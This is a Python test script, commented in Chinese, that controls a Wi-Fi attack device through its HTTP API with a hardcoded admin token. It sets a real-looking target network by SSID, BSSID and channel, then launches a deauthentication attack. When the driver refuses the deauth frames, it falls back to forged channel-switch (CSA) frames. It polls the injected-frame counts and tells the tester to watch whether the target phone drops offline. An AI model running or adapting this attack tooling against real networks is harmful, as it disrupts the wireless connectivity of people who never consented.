# -*- coding: utf-8 -*-
"""纯 HTTP 实测取消认证: 设目标 → 启动 Deauth(被拒时自动降级 CSA) → 轮询计数。

用法:
    python tools/deauth-kick-test.py [秒数] [SSID] [BSSID] [信道]

不碰 COM3 (该板 RTS 接复位脚, 开关串口即复位)。设备 AP 名不变, 电脑可一直
连着读状态; 真机验收时盯着目标手机是否掉线即可。
"""
import json
import subprocess
import sys
import time
import urllib.request

sys.stdout.reconfigure(encoding="utf-8", line_buffering=True)

TOKEN = "admin888"
BASE = "http://192.168.4.1"
SECONDS = int(sys.argv[1]) if len(sys.argv) > 1 else 30
TARGET = {
    "ssid": sys.argv[2] if len(sys.argv) > 2 else "CMCC-F2UC",
    "bssid": sys.argv[3] if len(sys.argv) > 3 else "E2:5C:F4:BC:16:62",
    "channel": int(sys.argv[4]) if len(sys.argv) > 4 else 6,
    "auth": "WPA/WPA2",
}
HDR = {"X-Admin-Token": TOKEN, "Content-Type": "application/json"}


def req(path, body=None, timeout=6):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=HDR,
                               method="POST" if body is not None else "GET")
    return urllib.request.urlopen(r, timeout=timeout).read().decode()


def ensure_wifi():
    """设备可能因上一次测试复位: 连不上就重连设备热点再试。"""
    for _ in range(3):
        try:
            req("/api/info", timeout=3)
            return True
        except Exception:
            subprocess.run(["netsh", "wlan", "connect", "name=WiFi-12F9"], capture_output=True)
            time.sleep(5)
    return False


print("连接设备 ->", ensure_wifi())
info = json.loads(req("/api/info"))
print("设备: ssid=%s ch=%s uptime=%ss" % (info.get("ssid"), info.get("channel"), info.get("uptime")))
print("设置目标 ->", req("/api/target", TARGET))


def start_deauth():
    """启动可能因 AP 切信道而断连, 重试并允许"已启动但响应丢了"。"""
    for attempt in range(3):
        try:
            return req("/api/deauth/start", {}, timeout=15)
        except Exception as e:
            print("启动请求超时/断连 (%s), 第 %d 次重试..." % (type(e).__name__, attempt + 1))
            time.sleep(5)
            ensure_wifi()
    try:
        return "已启动? 状态=" + req("/api/deauth/status", timeout=8)
    except Exception as e:
        return "启动失败 (%s)" % type(e).__name__


print("启动 Deauth ->", start_deauth())

t0 = time.time()
last = None
try:
    while time.time() - t0 < SECONDS:
        try:
            last = json.loads(req("/api/deauth/status"))
        except Exception as e:
            # 攻击前会把本机 AP 切到目标信道, 电脑会短暂重连 → 容忍瞬时失败继续轮询
            print("  t+%02ds 连接中断 (%s), 等待重连..." % (int(time.time() - t0), type(e).__name__))
            time.sleep(3)
            continue
        print("  t+%02ds running=%s injected=%s csa=%s platformBlocked=%s txErr=%s count=%s"
              % (int(time.time() - t0), last.get("running"), last.get("injected"), last.get("csa"),
                 last.get("platformBlocked"), last.get("txErr"), last.get("count")))
        time.sleep(3)
finally:
    try:
        print("停止 ->", req("/api/deauth/stop", {}))
    except Exception as e:
        print("停止请求失败 (%s) —— 请到后台手动点停止" % type(e).__name__)
print("末态:", last)
print("判读: platformBlocked=false + txErr=0 + count 递增 = 帧真实发出;")
print("      csa=true 表示真 Deauth 被驱动拒绝, 已降级为伪造 CSA (效果依赖客户端)。")
